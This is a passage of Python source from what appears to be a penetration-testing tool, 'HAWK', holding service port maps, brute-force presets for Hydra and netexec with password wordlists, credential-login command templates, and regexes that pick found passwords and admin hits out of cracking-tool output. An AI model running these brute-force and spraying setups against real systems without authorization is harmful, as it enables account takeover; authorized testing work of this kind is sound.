        # HTTP family
        80:    "http", 8000:  "http", 8008:  "http", 8080:  "http",
        8081:  "http", 8088:  "http", 8888:  "http", 81:    "http",
        # HTTPS family
        443:   "https", 8443: "https", 9443:  "https", 4443: "https",
        # SMB / NetBIOS
        139:   "smb",  445:   "smb",
        # LDAP family
        389:   "ldap", 636:   "ldap", 3268:  "ldap", 3269:  "ldap",
        # MySQL / MariaDB
        3306:  "mysql", 33306: "mysql",
        # PostgreSQL
        5432:  "postgresql", 5433: "postgresql", 54320: "postgresql",
        # MSSQL
        1433:  "mssql", 14330: "mssql", 14333: "mssql",
        # RDP
        3389:  "rdp",  3390:  "rdp",
        # WinRM
        5985:  "winrm", 5986: "winrm",
        # VNC (each display = +1)
        5900:  "vnc",  5901:  "vnc",  5902:  "vnc",  5903:  "vnc",
        5904:  "vnc",  5905:  "vnc",
        # Redis
        6379:  "redis", 16379: "redis",
        # MongoDB
        27017: "mongodb", 27018: "mongodb", 27019: "mongodb",
    }

    # ─── Substring → canonical service rules ─────────────────────────────────
    # Order matters — first match wins.  Specific tokens precede generic
    # ones to avoid collisions (e.g. "vsftpd" is matched as ftp BEFORE the
    # "sftp" rule that maps to ssh; "https" precedes "http"; "ldaps"
    # precedes "ldap" though both map to "ldap").  Used by _resolve_service
    # when nmap returns a brand-named service like "vsftpd 2.3.4" or
    # "OpenSSH 7.6p1" instead of the canonical short form.
    _SVC_SUBSTRING_RULES = [
        # Exact aliases (kept here too for the unified resolver path)
        ("microsoft-ds", "smb"),
        ("netbios-ssn",  "smb"),
        ("ms-wbt",       "rdp"),
        ("ms-sql",       "mssql"),

        # FTP variants — must come BEFORE bare "ftp" rule, and the FTP
        # variants that contain "sftp" as a substring (vsftpd) must come
        # BEFORE the sftp rule below.
        ("vsftpd",       "ftp"),
        ("proftpd",      "ftp"),
        ("proftp",       "ftp"),
        ("pureftpd",     "ftp"),
        ("pure-ftpd",    "ftp"),
        ("ccproxy-ftp",  "ftp"),
        ("ftp-proxy",    "ftp"),
        ("ftps",         "ftp"),     # FTP-over-TLS — same protocol
        ("ftp-data",     "ftp"),

        # SSH variants — sftp must come BEFORE bare "ftp" so SFTP gets
        # ssh treatment (it's the SSH subsystem, not FTP).
        ("sftp",         "ssh"),
        ("openssh",      "ssh"),
        ("dropbear",     "ssh"),

        # Bare "ftp" — catches anything not handled above (raw ftpd, etc.)
        ("ftp",          "ftp"),

        # Bare "ssh"
        ("ssh",          "ssh"),

        # HTTP family — https BEFORE http to handle "https" string correctly
        ("https",        "https"),
        ("ssl/http",     "https"),
        ("http-proxy",   "http"),
        ("http-alt",     "http"),
        ("http",         "http"),

        # SMTP variants
        ("postfix",      "smtp"),
        ("sendmail",     "smtp"),
        ("exim",         "smtp"),
        ("smtp",         "smtp"),

        # SMB / Samba / CIFS
        ("samba",        "smb"),
        ("cifs",         "smb"),
        ("smb",          "smb"),

        # Database servers
        ("mariadb",      "mysql"),
        ("mysql",        "mysql"),
        ("postgresql",   "postgresql"),
        ("postgres",     "postgresql"),
        ("mssql",        "mssql"),

        # Remote services
        ("telnet",       "telnet"),
        ("vnc",          "vnc"),
        ("rdp",          "rdp"),
        ("winrm",        "winrm"),
        ("wsman",        "winrm"),

        # Misc data stores / directory
        ("redis",        "redis"),
        ("mongo",        "mongodb"),
        ("ldap",         "ldap"),
    ]




    # ═══════════════════════════════════════════════════════════════════
    #  CAPTURE REGISTRY — actions whose output is analyzed by HAWK
    # ═══════════════════════════════════════════════════════════════════
    # Listed actions run via HAWK's ToolRunner instead of an xterm — their
    # output is fed through the per-service parser below and any discovered
    # finding (anon login, pwn3d, web fingerprint, LDAP namingContext, …)
    # is pushed into Target Intel via add_auto_finding().
    #
    # Everything NOT listed here opens a native terminal for interactive
    # use (smb connect-to-share, evil-winrm shell, RDP GUI, mysql prompt,
    # ssh session, etc.).
    # ═══════════════════════════════════════════════════════════════════
    _CAPTURE_ACTIONS = {
        "smb":        {"enum_anon", "enum_guest", "enum_auth", "enum_hash",
                        "check_creds"},
        "winrm":      {"oneshot", "check_creds"},
        "rdp":        {"check_nla"},
        "ssh":        {"enum_auth"},
        "ftp":        {"list_anon", "download_anon"},
        "http":       {"head", "get", "basic_auth", "whatweb"},
        "https":      {"head", "get", "cert_info"},
        "mysql":      {"list_dbs", "empty_root"},
        "postgresql": {"list_dbs"},
        "mssql":      {"check_creds"},
        "ldap":       {"anon_base", "anon_dump", "auth_dump", "ad_users"},
        "redis":      {"info"},
        "vnc":        {"check_nla"},
        "smtp":       {"banner", "vrfy", "vrfy_single", "open_relay"},
        # Telnet brute force runs captured so the hydra output parser
        # can extract found credentials and push them to the cred store.
        # banner / no_auth use nmap which we also want to capture.
        "telnet":     {"brute", "brute_creds", "no_auth", "banner"},
        # Brute-force actions injected by _build_brute_actions() are
        # always captured — same parsing flow as telnet brute.  Listed
        # here so _action_is_captured returns True even if the profile's
        # static actions list doesn't yet have them (the injection
        # happens at dialog-open time).
        "ssh":        {"enum_auth", "brute", "brute_creds",
                        "brute_ncrack", "brute_creds_ncrack"},
        "ftp":        {"list_anon", "download_anon",
                        "brute", "brute_creds"},
        "smb":        {"enum_anon", "enum_guest", "enum_auth", "enum_hash",
                        "check_creds", "brute", "brute_creds"},
        "mysql":      {"list_dbs", "empty_root",
                        "brute", "brute_creds"},
        "postgresql": {"list_dbs", "brute", "brute_creds"},
        "mssql":      {"check_creds", "brute", "brute_creds"},
        "rdp":        {"check_nla", "brute", "brute_creds"},
        "winrm":      {"oneshot", "check_creds",
                        "brute", "brute_creds"},
        "vnc":        {"check_nla", "brute"},          # VNC: password-only
        "ldap":       {"anon_base", "anon_dump", "auth_dump", "ad_users",
                        "brute", "brute_creds"},
        "http":       {"head", "get", "basic_auth", "whatweb",
                        "brute", "brute_creds"},
        "https":      {"head", "get", "cert_info",
                        "brute", "brute_creds"},
        "redis":      {"info", "brute"},               # Redis: password-only
        "mongodb":    {"brute", "brute_creds"},
    }

    # ─── Brute-force presets (per-service hydra protocol + wordlists) ──────
    # Centralizes the brute-force config so we don't duplicate the same
    # template 14 times across SERVICE_PROFILES.  ``_build_brute_actions``
    # uses these to synthesize the brute / brute_creds action dicts at
    # Connect-dialog open time.
    _BRUTE_PRESETS = {
        "ssh": {
            "proto": "ssh", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/metasploit/unix_users.txt",
            "pass_wl":  "/usr/share/wordlists/metasploit/unix_passwords.txt",
            "lockout_aware": False,
        },
        "ftp": {
            "proto": "ftp", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/metasploit/unix_users.txt",
            "pass_wl":  "/usr/share/wordlists/metasploit/unix_passwords.txt",
            "lockout_aware": False,
        },
        "smb": {
            # netexec is the primary brute tool for SMB on HAWK.
            # Hydra's smb module historically only spoke SMBv1; on
            # SMB2/3 targets (Win Server 2008 R2+, modern Samba) it
            # dies immediately with "[ERROR] invalid reply from target
            # smb://...", leaving the operator with rc=255 and no
            # clue why.  netexec supports SMB1/2/3 transparently and
            # has the same wordlist semantics, so it's the safer
            # default.  The lockout dialog still surfaces Hydra as a
            # legacy fallback labelled "(legacy / SMB1 only)" for
            # operators who really need it.
            "proto": "smb", "tool": "netexec",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/rockyou.txt",
            "lockout_aware": True,        # ← AD-attached
        },
        "mysql": {
            "proto": "mysql", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/metasploit/mysql/mysql-default-username.txt",
            "pass_wl":  "/usr/share/wordlists/metasploit/mysql/mysql-betterdefaultpasslist.txt",
            "lockout_aware": False,
            # Native-client connect — drops the user at the `mysql>` prompt
            # with creds already validated. Password is passed via the
            # MYSQL_PWD env var (cleaner than -p'pass' which leaks in `ps`).
            "native_creds_tpl":
                "MYSQL_PWD='{pass}' mysql -h {host} -P {port} -u {user}",
        },
        "postgresql": {
            "proto": "postgres", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "lockout_aware": False,
            # Native-client connect — drops at the `postgres=#` prompt.
            "native_creds_tpl":
                "PGPASSWORD='{pass}' psql -h {host} -p {port} -U {user}",
        },
        "mssql": {
            "proto": "mssql", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "lockout_aware": True,        # ← if Windows-auth, AD-attached
            # Native-client connect via impacket — drops at the `SQL>` prompt.
            "native_creds_tpl":
                "impacket-mssqlclient '{user}':'{pass}'@{host} -port {port}",
        },
        "rdp": {
            "proto": "rdp", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/rockyou.txt",
            "lockout_aware": True,
        },
        "winrm": {
            # Hydra has no winrm module — netexec is the standard tool
            "proto": "winrm", "tool": "netexec",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/rockyou.txt",
            "lockout_aware": True,
        },
        "vnc": {
            # VNC has password-only auth — no -L flag, only -P
            "proto": "vnc", "tool": "Hydra",
            "users_wl": "",                     # not used
            "pass_wl":  "/usr/share/wordlists/seclists/Passwords/Common-Credentials/vnc-default-passwords.txt",
            "lockout_aware": False,
            "password_only": True,
        },
        "ldap": {
            # ldap2 = simple bind, ldap3 = NTLM bind (over LDAP); both work
            "proto": "ldap2", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/rockyou.txt",
            "lockout_aware": True,
            # Native-client connect — runs an authenticated bind via
            # ldapsearch. Empty -b is intentional: many LDAPs return the
            # rootDSE which already reveals the naming context the user
            # would otherwise have to discover by hand.
            "native_creds_tpl":
                "ldapsearch -x -H ldap://{host}:{port} -D '{user}' "
                "-w '{pass}' -b ''",
        },
        "http": {
            "proto": "http-get", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/rockyou.txt",
            "lockout_aware": False,
            "needs_path": True,                 # Hydra http-get needs a path
        },
        "https": {
            "proto": "https-get", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/rockyou.txt",
            "lockout_aware": False,
            "needs_path": True,
        },
        "redis": {
            "proto": "redis", "tool": "Hydra",
            "users_wl": "",
            "pass_wl":  "/usr/share/wordlists/seclists/Passwords/Common-Credentials/100-common-passwords.txt",
            "lockout_aware": False,
            "password_only": True,
            # Native-client connect — drops at the `host:port>` prompt.
            # Redis password-only auth: -a passes the AUTH password.
            "native_creds_tpl":
                "redis-cli -h {host} -p {port} -a '{pass}'",
        },
        "mongodb": {
            "proto": "mongodb", "tool": "Hydra",
            "users_wl": "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "pass_wl":  "/usr/share/wordlists/seclists/Passwords/Common-Credentials/100-common-passwords.txt",
            "lockout_aware": False,
            # Native-client connect — drops at the mongosh prompt.
            "native_creds_tpl":
                "mongosh --host {host} --port {port} -u '{user}' -p '{pass}'",
        },
    }





    # Service-key → cred store service tag.  Mostly an upper-case copy of
    # the key, but a few keys need normalisation (psql/mysql variants).
    _SVC_TAG_MAP = {
        "ssh":      "SSH",
        "ftp":      "FTP",
        "ftps":     "FTPS",
        "sftp":     "SFTP",
        "telnet":   "TELNET",
        "smb":      "SMB",
        "smb1":     "SMB",
        "smb2":     "SMB",
        "smb3":     "SMB",
        "rdp":      "RDP",
        "winrm":    "WINRM",
        "vnc":      "VNC",
        "mysql":    "MYSQL",
        "mariadb":  "MYSQL",
        "postgres": "POSTGRES",
        "postgresql": "POSTGRES",
        "mssql":    "MSSQL",
        "mongodb":  "MONGODB",
        "redis":    "REDIS",
        "ldap":     "LDAP",
        "ldaps":    "LDAPS",
        "smtp":     "SMTP",
        "imap":     "IMAP",
        "pop3":     "POP3",
        "http":     "HTTP",
        "https":    "HTTPS",
    }







    # ─── CONNECT failure-signature detection + legacy retry ──────────────

    # Per-service list of regexes that scream "this would have worked with
    # legacy compat flags".  Matching ONE of these after a non-modern
    # classification triggers the retry dialog.  Order doesn't matter.
    _LEGACY_RESCUE_SIGNATURES = {
        "ssh": [
            r"no matching host key type found",
            r"no matching key exchange method",
            r"no matching cipher found",
            r"Bad key types",
            r"Bad configuration option",
            r"Unable to negotiate with .+: no matching",
        ],
        "smb": [
            r"NT_STATUS_RESOURCE_NAME_NOT_FOUND",
            r"NT_STATUS_CONNECTION_DISCONNECTED",
            r"protocol negotiation failed",
            r"SMB1 disabled",
            r"No protocol was supported",
        ],
        "https": [
            r"alert protocol version",
            r"TLSv1 alert protocol",
            r"unsupported protocol",
            r"sslv3 alert handshake failure",
            r"dh key too small",
        ],
        "mysql": [
            r"ERROR 2026",
            r"TLS/SSL error.*wrong version number",
            r"SSL connection error",
            r"unknown variable 'ssl-mode",        # MariaDB rejecting MySQL-8 syntax
            r"Cannot connect: Invalid settings",  # MariaDB TLS mismatch
        ],
        "postgresql": [
            r"SSL error: unsupported protocol",
            r"SSL error: wrong version number",
            r"server does not support SSL connections",
        ],
        "mssql": [
            r"SSL: unsupported protocol",
            r"TLS handshake",
        ],
    }



    # ═════════════════════════════════════════════════════════════════════════
    # Captured CONNECT run — execute the command inside HAWK's terminal so we
    # can parse stdout and push findings into Target Intel.
    # ═════════════════════════════════════════════════════════════════════════
    # ── Lockout-aware brute force popup ──────────────────────────────────────
    # ═════════════════════════════════════════════════════════════════════════





    # ─── Result dispatcher ───────────────────────────────────────────────────


    # ─── Per-service parsers ─────────────────────────────────────────────────



    # Hydra success-line regex.  Format across protocols:
    #   [80][http-get] host: 1.2.3.4   login: admin   password: admin
    #   [21][ftp]      host: 1.2.3.4   login: user    password: pass
    #   [23][telnet]   host: 1.2.3.4   misc: (null)   login: user   password: pass
    #   [22][ssh]      host: 1.2.3.4   login: root    password: root
    # Telnet (and some other proto-dependent paths in hydra) inject an
    # extra "misc: <value>" field between `host:` and `login:` —
    # without an optional non-greedy slot the previous regex missed
    # every telnet hit, which silently dropped valid creds from the
    # Credential Store.  Password field can carry spaces / special
    # chars, so we capture non-greedily up to end-of-line and strip.
    _HYDRA_HIT_RE = __import__("re").compile(
        r"^\s*\[(\d+)\]\[([\w-]+)\]\s+host:\s+(\S+)\s+"
        r"(?:.*?\s+)?"                      # optional intermediate
                                            # fields (e.g. "misc: (null)")
        r"login:\s+(\S+)\s+password:\s+(.*?)\s*$",
        __import__("re").MULTILINE,
    )
    # netexec/nxc success line — `[+] DOMAIN\user:password (Pwn3d!)` or
    # `[+] target host\user:password` (workgroup case, no domain).
    # Group 1 = domain (may be empty), 2 = user, 3 = password,
    # 4 = " (Pwn3d!)" suffix when local-admin (always optional).
    _NXC_HIT_RE = __import__("re").compile(
        r"^\s*\[\+\]\s+(?:\S+\s+)*"           # optional preamble (target/host)
        r"([^\s\\]*)\\([^\s:]+):([^\r\n]*?)"   # DOMAIN\user:password
        r"(\s+\(Pwn3d!\))?\s*$",
        __import__("re").MULTILINE,
    )
    # netexec lockout / failed line — used for diagnostic findings
    _NXC_LOCKED_RE = __import__("re").compile(
        r"^\s*\[\-\]\s+\S+\s+([^\s\\]*)\\([^\s:]+):.*?"
        r"(STATUS_ACCOUNT_LOCKED_OUT|account locked|account disabled)",
        __import__("re").MULTILINE | __import__("re").IGNORECASE,
    )
    # kerbrute valid-login line — `[+] VALID LOGIN: user@domain.local:password`
    # The `[+]` may have a timestamp prefix on some kerbrute builds
    # (`2026/04/29 12:34:56 > [+] VALID LOGIN: ...`), so we don't anchor
    # on start-of-line — just require the `[+] VALID LOGIN:` token
    # somewhere on the line.
    _KERBRUTE_HIT_RE = __import__("re").compile(
        r"\[\+\]\s+VALID\s+LOGIN:\s+([^@\s]+)@(\S+):(.*?)\s*$",
        __import__("re").MULTILINE | __import__("re").IGNORECASE,
    )
    # patator success/failure rows — patator prints
    # `<num> | <code> | <size> | <time> | <candidate>`.  Hit codes are
    # 200/Login OK / similar; we conservatively grep for non-LOCKED
    # successes by looking for "user:password" candidates with no
    # "Account locked" tag in the trailing fields.
    _PATATOR_HIT_RE = __import__("re").compile(
        r"^\s*\d+\s+\|\s+(?P<code>\d+|OK|HIT)\s+\|"
        r"[^|]*\|[^|]*\|"
        r"\s+(?P<user>[^:|\s]+):(?P<pwd>[^|\r\n]+?)\s*$",
        __import__("re").MULTILINE,
    )
    # net pass-policy lines — captures lockoutThreshold / lockoutDuration
    # / lockoutObservationWindow values from netexec --pass-pol output.
    _PASSPOL_THRESHOLD_RE = __import__("re").compile(
        r"Account\s+Lockout\s+Threshold:\s*(\d+|None|Never)",
        __import__("re").IGNORECASE,
    )
    _PASSPOL_DURATION_RE = __import__("re").compile(
        r"Account\s+Lockout\s+Duration:\s*(\d+|None)\s*(\w+)?",
        __import__("re").IGNORECASE,
    )


    # ── netexec brute / spray output parser ───────────────────────────────────

    # ── kerbrute output parser (Kerberos pre-auth spray) ──────────────────────

    # ── patator brute output parser ───────────────────────────────────────────

    # ── netexec --pass-pol output parser ──────────────────────────────────────

    # SMB — smbclient -L, smbmap, netexec smb --shares ────────────────────────

    # WinRM — netexec winrm / evil-winrm probe ───────────────────────────────

    # RDP — rdp-sec-check / netexec rdp ──────────────────────────────────────

    # SSH — ssh -v auth method probe ─────────────────────────────────────────

    # FTP — anonymous listing / download ─────────────────────────────────────

    # HTTP / HTTPS — curl -I / curl / whatweb ────────────────────────────────
    # Helper regexes for HTTP parsing — compiled once, reused across calls.
    _HTTP_HEADER_RE = __import__("re").compile(
        r"^([A-Za-z][A-Za-z0-9\-]*):\s*([^\r\n]+)",
        __import__("re").MULTILINE,
    )
    # CMS / framework body markers — order matters (more specific first).
    _CMS_MARKERS = [
        # WordPress
        (r"/wp-content/",                      "WordPress (wp-content/ path)"),
        (r"/wp-includes/",                     "WordPress (wp-includes/ path)"),
        (r"<meta\s+name=['\"]generator['\"]\s+content=['\"]WordPress\s+([\d.]+)",
                                                "WordPress version: \\1"),
        # Drupal
        (r"/sites/default/files/",             "Drupal (sites/default/ path)"),
        (r"Drupal\.settings",                  "Drupal (Drupal.settings JS)"),
        (r"<meta\s+name=['\"]generator['\"]\s+content=['\"]Drupal\s+([\d.]+)",
                                                "Drupal version: \\1"),
        # Joomla
        (r"/components/com_",                  "Joomla (com_ component)"),
        (r"<meta\s+name=['\"]generator['\"]\s+content=['\"]Joomla!?\s*([\d.]*)",
                                                "Joomla\\1"),
        # phpMyAdmin / DVWA / Mutillidae / WebGoat / Tomcat
        (r"phpMyAdmin",                        "phpMyAdmin"),
        (r"Damn Vulnerable Web App",           "DVWA (vulnerable testbed)"),
        (r"Mutillidae",                        "Mutillidae (vulnerable testbed)"),
        (r"WebGoat",                           "WebGoat (vulnerable testbed)"),
        (r"Apache Tomcat",                     "Apache Tomcat"),
        (r"<title>Apache.*?Default Page",      "Apache default page (no app deployed)"),
        # Generic generator
        (r"<meta\s+name=['\"]generator['\"]\s+content=['\"]([^'\"]+)['\"]",
                                                "Generator: \\1"),
    ]
    # Cookie-name → backend stack hint
    _COOKIE_STACK = {
        "PHPSESSID":         "PHP backend",
        "JSESSIONID":        "Java/JSP backend (Tomcat / Jetty / WebLogic / JBoss)",
        "ASP.NET_SessionId": "ASP.NET backend (IIS)",
        "ASPSESSIONID":      "Classic ASP backend (legacy IIS)",
        "ASPXAUTH":          "ASP.NET Forms auth",
        "connect.sid":       "Node.js backend (Express)",
        "_session_id":       "Ruby on Rails backend",
        "django_session":    "Django backend",
        "laravel_session":   "Laravel backend (PHP)",
        "ci_session":        "CodeIgniter backend (PHP)",
        "symfony":           "Symfony backend (PHP)",
        "AWSALB":            "AWS Application Load Balancer",
        "AWSELB":            "AWS Classic Load Balancer",
        "__cfduid":          "Cloudflare CDN/WAF",
        "cf_clearance":      "Cloudflare WAF (challenge)",
        "akamai":            "Akamai CDN",
    }


    # MySQL — list DBs / empty root ──────────────────────────────────────────

    # PostgreSQL ─────────────────────────────────────────────────────────────

    # MSSQL — netexec mssql ──────────────────────────────────────────────────

    # LDAP — anonymous bind / dump ───────────────────────────────────────────

    # Redis — unauthenticated INFO ───────────────────────────────────────────

    # VNC — vncviewer / nmap vnc-info ────────────────────────────────────────

    # SMTP — banner / VRFY / open relay ──────────────────────────────────────

    # ─── Quick service probe (socket-based) ──────────────────────────────────






    # ─── Exploit search ──────────────────────────────────────────────────────









    # ─── Tab blink ───────────────────────────────────────────────────────────
    # Alternates RED ↔ CYAN on the "TARGET INTEL" tab label and appends
    # a " (N new)" badge so the user notices even if focused elsewhere.
    # The blink runs for ~8 seconds (24 × 320ms) and is much harder to
    # miss than the previous subtle grey/cyan cycle. When the user opens
    # the Target Intel tab, _blink_stop() resets the badge.


# ════════════════════════════════════════════════════════════════════════
# STEP 5 / Fase 3 — YAML profile overlay
# ════════════════════════════════════════════════════════════════════════
# Replace the hardcoded `_CONNECT_CHEATSHEETS` + `_CHEATSHEET_ALIAS_MAP`
# class attributes with whatever the YAML loader returns from:
#   1. <hawkC>/profiles/db_profiles/*.yaml  (bundled defaults)
#   2. ~/.config/hawk/db_profiles/*.yaml    (user extensions)
#
# Failure modes — all FALL BACK to the hardcoded class attributes
# (no exception escapes):
#   • PyYAML not installed
#   • Profile dirs missing / empty
#   • All files fail validation
#   • Unexpected exception in the loader itself
#
# The loader logs every skip/error to stderr so the operator sees
# WHY a profile didn't land, without crashing HAWK.
try:
    from utils.db_profile_loader import load_profiles as _load_profiles
    _yaml_cheatsheets, _yaml_aliases = _load_profiles()
    if _yaml_cheatsheets:
        TargetIntelWidget._CONNECT_CHEATSHEETS = _yaml_cheatsheets
        TargetIntelWidget._CHEATSHEET_ALIAS_MAP = _yaml_aliases
except Exception as _e:
    import sys as _sys
    print(
        f"[HAWK] target_intel_widget: YAML profile overlay failed "
        f"({type(_e).__name__}: {_e}); using hardcoded fallback dict.",
        file=_sys.stderr)


